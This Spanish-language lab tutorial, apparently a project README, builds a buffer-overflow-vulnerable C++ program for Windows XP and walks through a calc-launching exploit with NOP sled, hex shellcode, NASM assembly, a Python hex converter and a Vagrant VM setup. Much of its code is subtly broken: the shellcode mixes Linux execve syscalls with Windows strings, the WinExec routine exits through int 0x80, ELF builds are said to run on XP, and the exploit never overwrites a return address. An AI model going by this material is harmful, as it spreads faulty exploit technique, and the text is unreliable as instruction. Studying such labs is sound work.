# Tsunami

Este script realiza el proceso para aprovechar una vulnerabilidad en un programa. Este proceso consta de dos fases: la creación del programa vulnerable y la construcción del "payload" que se enviará durante la ejecución.

En la primera fase, se crea un programa que tiene una vulnerabilidad específica. Este programa vulnerable se diseñará de tal manera que permita la ejecución de código malicioso o acciones no deseadas. El objetivo es verificar y confirmar que el programa desarrollado es realmente vulnerable.

En la segunda fase, se construye el "payload", que es el componente que se enviará al programa vulnerable durante la explotación de la vulnerabilidad. En este caso, se menciona que el nombre del programa será "tsunami.exe" y recibirá un parámetro como argumento. El "payload" estará diseñado para abrir automáticamente la calculadora de Windows XP cuando se explote la vulnerabilidad en el programa.

El "payload" debe contener el "shellcode", que es el código que se ejecutará para lograr el objetivo deseado. En este caso, se menciona que el objetivo es abrir la calculadora de Windows XP. El "shellcode" es una parte fundamental de la técnica utilizada en este proceso.

En resumen, el proceso descrito implica la creación de un programa vulnerable, la construcción de un "payload" que se enviará para aprovechar la vulnerabilidad y la inclusión de un "shellcode" en el "payload" para ejecutar el código deseado. El objetivo final es lograr la ejecución de acciones maliciosas o no autorizadas en el sistema aprovechando la vulnerabilidad en el programa.


## Qué es el shellcode?

El "shellcode" es una secuencia de instrucciones de código de bajo nivel que se utiliza en el ámbito de la seguridad informática y la explotación de vulnerabilidades. Es un componente central en las técnicas de ejecución de código malicioso o no autorizado.

El objetivo del shellcode es aprovechar una vulnerabilidad en un programa o sistema para lograr ejecutar un conjunto específico de instrucciones. Estas instrucciones suelen estar diseñadas para realizar acciones maliciosas, como tomar el control del sistema, obtener acceso no autorizado, iniciar procesos o realizar acciones en nombre del usuario afectado.

El shellcode se suele escribir en lenguaje ensamblador o en código de máquina, lo que permite una ejecución directa y eficiente en el entorno objetivo. Debido a la naturaleza de bajo nivel del shellcode, se busca que sea lo más compacto y sigiloso posible para evitar la detección y evadir las medidas de seguridad.

En el contexto de la pregunta anterior, se menciona que el payload debe contener el shellcode, es decir, el código específico que se ejecutará para lograr abrir la calculadora de Windows XP. En este caso, el shellcode estaría diseñado para aprovechar la vulnerabilidad en el programa vulnerable y realizar la acción deseada de forma no autorizada.


## Ejemplo de vulnerabilidad por desbordamiento de buffer

Aquí tienes un ejemplo básico de una aplicación de consola en C++ vulnerable a un desbordamiento de búfer en Windows XP:


        #include <iostream>
        #include <cstring>

        void vulnerableFunction(char* input)
        {
            char buffer[10];
            strcpy(buffer, input);
            std::cout << "Buffer: " << buffer << std::endl;
        }

        int main()
        {
            char userInput[20];
            std::cout << "Ingrese una cadena de más de 10 caracteres: ";
            std::cin >> userInput;
            
            vulnerableFunction(userInput);
            
            return 0;
        }


En este ejemplo, la función vulnerableFunction recibe un parámetro input y copia su contenido en un búfer de tamaño fijo de 10 bytes. Sin embargo, si el usuario ingresa una cadena de caracteres que excede el tamaño del búfer, se producirá un desbordamiento de búfer, lo que puede permitir que un atacante sobrescriba la memoria adyacente y ejecute código malicioso.

Este tipo de vulnerabilidad es comúnmente explotado para ejecutar código arbitrario o realizar ataques de denegación de servicio.


## Exploit para ejecutar la calculadora de windows
Para lograr que se ejecute la calculadora de Windows como parte del desbordamiento de búfer en el ejemplo anterior, necesitamos crear un payload que contenga un shellcode específico. Aquí tienes un ejemplo de cómo podría ser el payload:


// Estas son las directivas de preprocesador que incluyen las bibliotecas necesarias para utilizar
// las funciones estándar de entrada/salida y manipulación de cadenas.

#include <iostream>
#include <cstring>


// Aquí se define una variable llamada shellcode que contiene el shellcode en formato de cadena de
// caracteres. El shellcode está representado en formato hexadecimal y es específico para ejecutar
// la calculadora de Windows.

        const char shellcode[] = "\x31\xc0\x50\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x50\x68\x64\x6f\x77\x6e\x68\x72\x33\x32\x2e\x68\x75\x73\x65\x72\x68\x33\x32\x2e\x64\x68\x6c\x6c\x33\x2e\x68\x65\x78\x65\x2e\x68\x65\x2e\x6f\x72\x68\x2e\x6f\x72\x67\x68\x65\x72\x74\x61\x68\x33\x32\x2e\x64\x68\x73\x68\x65\x6c\x89\xe1\x50\x68\x63\x61\x6c\x63\x89\xe2\x52\x51\x53\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80";


// Esta función vulnerableFunction recibe un puntero a un char como argumento. En ella se declara 
// una variable buffer de tamaño 10 y se utiliza la función strcpy para copiar el contenido del 
// argumento input al buffer. Esto crea una vulnerabilidad de desbordamiento de búfer, ya que no 
// se realiza ninguna verificación del tamaño de input antes de copiarlo en buffer. Finalmente, 
// se imprime el contenido de buffer en la consola.

        void vulnerableFunction(char* input)
        {
            char buffer[10];
            strcpy(buffer, input);
            std::cout << "Buffer: " << buffer << std::endl;
        }

// La función main es el punto de entrada del programa. Aquí se declara un arreglo userInput de 
// tamaño 256 para almacenar la entrada del usuario. La función memset se utiliza para llenar 
// userInput con instrucciones NOP (\x90), que son operaciones que no hacen nada y se utilizan para
// ajustar el tamaño del búfer. Luego, la función memcpy se utiliza para copiar el shellcode al 
// final de userInput para que se ejecute cuando se produzca el desbordamiento de búfer. Finalmente,
// se llama a vulnerableFunction pasando userInput como argumento.

        int main()
        {
            char userInput[256];
            memset(userInput, '\x90', sizeof(userInput));  // Fill userInput with NOP instructions
            memcpy(userInput + sizeof(userInput) - sizeof(shellcode), shellcode, sizeof(shellcode));  // Copy the shellcode to the end of userInput

            vulnerableFunction(userInput);

            return 0;
        }

En este caso, el shellcode utilizado está diseñado para ejecutar la calculadora de Windows. Se ha codificado en hexadecimal y se encuentra en la variable shellcode. El payload se crea llenando el userInput con instrucciones NOP (\x90) y luego copiando el shellcode al final del userInput. Esto asegura que cuando se produzca el desbordamiento de búfer, el flujo de ejecución se desplace hacia el shellcode y se ejecute la calculadora de Windows.

## Shellcode

El desarrollo de shellcode implica escribir código en lenguaje ensamblador que realizará una acción específica cuando se ejecute. A continuación, te doy una descripción general de los pasos involucrados en el desarrollo de shellcode:

1. Conocer la arquitectura objetivo: Antes de desarrollar shellcode, debes comprender la arquitectura del sistema objetivo, como x86, x64, ARM, etc. Esto es importante porque el shellcode debe estar escrito específicamente para la arquitectura en la que se ejecutará.

2. Elegir el objetivo: Determina qué acción deseas lograr con el shellcode. Puede ser ejecutar un programa específico, abrir una shell, deshabilitar medidas de seguridad, etc. Tener claridad sobre el objetivo te ayudará a definir las instrucciones que necesitarás.

3. Escribir el código en lenguaje ensamblador: Utiliza un ensamblador y un editor de texto para escribir el código en lenguaje ensamblador. El código debe ser lo más eficiente posible, teniendo en cuenta las limitaciones del entorno objetivo.

4. Optimizar y probar: Una vez que hayas escrito el código en lenguaje ensamblador, puedes optimizarlo y asegurarte de que funcione correctamente. Puedes utilizar emuladores o máquinas virtuales para probar el shellcode en un entorno controlado antes de usarlo en un sistema real.

5. Convertir el código en formato shellcode: El código escrito en lenguaje ensamblador debe convertirse en un formato adecuado para ser ejecutado como shellcode. Esto generalmente implica la eliminación de instrucciones nulas y la representación del código en formato hexadecimal o binario.

Además, es recomendable estudiar en profundidad la arquitectura y el funcionamiento de los sistemas objetivo, así como mantenerse actualizado sobre las técnicas de mitigación de seguridad que pueden afectar la ejecución del shellcode.

## Ensamblador Win XP - NASM

En Windows XP, puedes utilizar el ensamblador NASM (Netwide Assembler) para escribir y compilar código en lenguaje ensamblador. NASM es un ensamblador de código abierto que es ampliamente utilizado y compatible con la arquitectura x86.

Puedes descargar NASM desde su sitio oficial (https://www.nasm.us/) e instalarlo en tu sistema Windows XP. Una vez instalado, podrás utilizar el comando nasm para ensamblar tus archivos de código fuente en lenguaje ensamblador.

## 

Para compilar y ensamblar este programa con NASM, puedes utilizar los siguientes comandos:

    nasm -f elf32 tu_programa.asm -o tu_programa.o
    ld -m elf_i386 tu_programa.o -o tu_programa

Esto generará un archivo ejecutable llamado "tu_programa" que puedes ejecutar en Windows XP. Ten en cuenta que este es solo un ejemplo básico y puedes escribir programas más complejos utilizando NASM.

**Otra manera: (entorno mingw)**

El paso 5 en el código ensamblador proporcionado anteriormente se refiere a la llamada a la función WinExec para ejecutar la calculadora en Windows XP.

Si deseas ejecutar la calculadora en Windows XP de forma legítima y segura, puedes seguir los siguientes pasos:

Abre un nuevo archivo de texto en el Bloc de notas o en tu editor de texto preferido.

Copia y pega el código ensamblador proporcionado anteriormente en el archivo.

Guarda el archivo con una extensión de nombre ".asm", por ejemplo, "calc.asm".

Abre el símbolo del sistema (CMD) y navega hasta la ubicación donde guardaste el archivo ".asm".

Asegúrate de tener instalado el ensamblador NASM (Netwide Assembler) en tu sistema. Puedes descargarlo desde el sitio oficial de NASM: https://www.nasm.us/.

En el símbolo del sistema, ejecuta el siguiente comando para ensamblar el código fuente y generar un archivo objeto (archivo ".obj"):

(arduino)
nasm -fwin32 calc.asm -o calc.obj
Luego, ejecuta el siguiente comando para enlazar el archivo objeto y generar un archivo ejecutable (archivo ".exe"):

gcc calc.obj -o calc.exe

Asegúrate de tener instalado el compilador GCC (GNU Compiler Collection) en tu sistema. Puedes descargarlo desde el sitio oficial de MinGW: http://www.mingw.org/.

Una vez que se haya generado el archivo ejecutable "calc.exe", puedes ejecutarlo en Windows XP simplemente haciendo doble clic en el archivo o ejecutándolo desde el símbolo del sistema.

**Para Windows XP**

Para Windows XP, puedes utilizar el ensamblador NASM para generar un archivo objeto (".obj") y luego utilizar el enlazador de Microsoft (Link) para generar un archivo ejecutable (".exe"). A continuación, te proporciono los pasos actualizados:

Abre un nuevo archivo de texto en el Bloc de notas o en tu editor de texto preferido.

Copia y pega el código ensamblador proporcionado anteriormente en el archivo.

Guarda el archivo con una extensión de nombre ".asm", por ejemplo, "calc.asm".

Abre el símbolo del sistema (CMD) y navega hasta la ubicación donde guardaste el archivo ".asm".

Asegúrate de tener instalado el ensamblador NASM en tu sistema. Puedes descargarlo desde el sitio oficial de NASM: https://www.nasm.us/.

En el símbolo del sistema, ejecuta el siguiente comando para ensamblar el código fuente y generar un archivo objeto (".obj"):

    nasm -fwin32 calc.asm -o calc.obj

A continuación, ejecuta el siguiente comando para utilizar el enlazador de Microsoft y generar el archivo ejecutable (".exe"):

    link /SUBSYSTEM:WINDOWS /ENTRY:main calc.obj

Una vez que se haya generado el archivo ejecutable "calc.exe", puedes ejecutarlo en Windows XP simplemente haciendo doble clic en el archivo o ejecutándolo desde el símbolo del sistema.

Es importante destacar que estos comandos pueden funcionar en un entorno Windows XP con las herramientas NASM y el enlazador de Microsoft adecuadamente instalados. Sin embargo, ten en cuenta que Windows XP es un sistema operativo descontinuado y no se recomienda su uso debido a problemas de seguridad y falta de actualizaciones.

## Codigo ensamblador para ejecutar la calculadora en windows xp.

Aquí tienes un ejemplo de código en ensamblador para ejecutar la calculadora en Windows XP:

assembly
Copy code
section .data
    cmdline db 'calc.exe', 0

section .text
    global _start

_start:
    ; Cargar dirección de la cadena cmdline en ECX
    mov ecx, cmdline

    ; Llamar a la función WinExec para ejecutar la calculadora
    push 0
    push ecx
    mov eax, 0x77d8ffbd  ; Dirección de la función WinExec en la biblioteca kernel32.dll
    call eax

    ; Salir del programa
    mov eax, 1
    xor ebx, ebx
    int 0x80

En este código, utilizamos la función WinExec de la biblioteca kernel32.dll para ejecutar la calculadora. Aquí está la explicación línea por línea:

section .data
    cmdline db 'calc.exe', 0

Definimos la sección de datos (section .data) y declaramos una variable llamada cmdline que contiene el nombre del ejecutable de la calculadora (calc.exe). Agregamos un byte nulo (0) al final para indicar el final de la cadena.

section .text
    global _start

_start:

Definimos la sección de código (section .text) y marcamos el punto de entrada del programa con la etiqueta _start.

    ; Cargar dirección de la cadena cmdline en ECX
    mov ecx, cmdline

Movemos la dirección de la cadena cmdline en el registro ECX. Esto nos permite pasar la dirección de la cadena como argumento a la función WinExec.

    ; Llamar a la función WinExec para ejecutar la calculadora
    push 0
    push ecx
    mov eax, 0x77d8ffbd  ; Dirección de la función WinExec en la biblioteca kernel32.dll
    call eax

Preparamos los argumentos para llamar a la función WinExec. Primero, empujamos un valor cero en la pila como el segundo argumento para indicar que queremos ejecutar el programa en modo predeterminado. Luego, empujamos la dirección de la cadena cmdline en la pila como el primer argumento. Movemos la dirección de la función WinExec en el registro EAX y luego realizamos una llamada a la función WinExec utilizando la instrucción call. Esto ejecutará la calculadora en Windows XP.

    ; Salir del programa
    mov eax, 1
    xor ebx, ebx
    int 0x80

Finalmente, utilizamos instrucciones similares al ejemplo anterior para salir del programa.

Recuerda que este código específico está diseñado para Windows XP y puede no ser compatible con otras versiones de Windows. Además, ten en cuenta que la ejecución de código malicioso sin el consentimiento del usuario puede ser ilegal y dañino.

## Como pasar de ASM a Shellcode Hex

Para convertir el código ensamblador en formato shellcode, se puede utilizar una combinación de herramientas y técnicas. A continuación, te mostraré un ejemplo de cómo convertir el código ensamblador a formato shellcode utilizando Python y la biblioteca binascii:

Toma el código ensamblador que deseas convertir a shellcode. Por ejemplo, considera el siguiente código ensamblador para ejecutar la calculadora en Windows:

section .text
global _start

_start:
    jmp short call_shellcode

shellcode:
    pop esi
    xor eax, eax
    mov byte [esi + 7], al
    push esi
    mov ebx, esi
    mov long [esi + 8], ebx
    mov long [esi + 12], eax
    mov byte al, 0x0b
    mov ecx, esi
    lea edx, [esi + 8]
    int 0x80

call_shellcode:
    call shellcode
    db 'calc', 0x00
    
Guarda el código ensamblador en un archivo con extensión ".asm", por ejemplo, "shellcode.asm".

Utiliza NASM para ensamblar el archivo ".asm" y generar un archivo objeto (".obj"):

    nasm -f elf32 -o shellcode.o shellcode.asm
    
Luego, utiliza ld (enlazador) para enlazar el archivo objeto y generar un archivo ejecutable:

    ld -m elf_i386 -o shellcode shellcode.o

Ahora, vamos a convertir el archivo ejecutable en formato hexadecimal utilizando Python. Crea un nuevo archivo Python y copia el siguiente código:

    import binascii

    with open('shellcode', 'rb') as f:
        shellcode_bytes = f.read()

    shellcode_hex = binascii.hexlify(shellcode_bytes).decode()
    print(shellcode_hex)

Ejecuta el script Python y obtendrás el código ensamblador convertido a formato shellcode en hexadecimal.

Este proceso toma el archivo ejecutable generado por NASM y lo convierte en una cadena hexadecimal que representa el shellcode. Puedes utilizar este shellcode en diferentes contextos, como explotación de vulnerabilidades o pruebas de seguridad.


## VM Win XP SP3


Vagrantfile (WindowsXP)
==============================================================
Vagrant.configure("2") do |config|
   config.vm.box = "dvgamerr/win-xp-sp3"
   config.vm.hostname = "WindowsXP"
   config.disksize.size = '1024MB'
   config.vm.network "private_network", ip: "172.16.0.100"
   config.vm.synced_folder ".", "C:/Documents and settings/My Documents"
   config.vm.provider :virtualbox do |vb|
	vb.name = "Tsunami"
	vb.memory = "1028"
   end
end 

//    default: Adapter 1: nat
//    default: Adapter 2: hostonly
//    default: 22 (guest) => 2222 (host) (adapter 1)


WinXP: Visual Studio -> create New Project -> New File c++
==============================================================
c++: tsunami.exe (buffer size = 10 chars)

If input > buffer.size -> ERROR: 'Unhandled exception in tsunami.exe: 0xC0000005: Access Violation

Exception Access Violation is an error you may see on your Windows computer when you try to execute a specific program or function. This error indicates that the program attempted to access memory it did not have permission to read, write, or execute.


Install NASM: convert calc.asm to calc.obj
Install gcc to compile calc.obj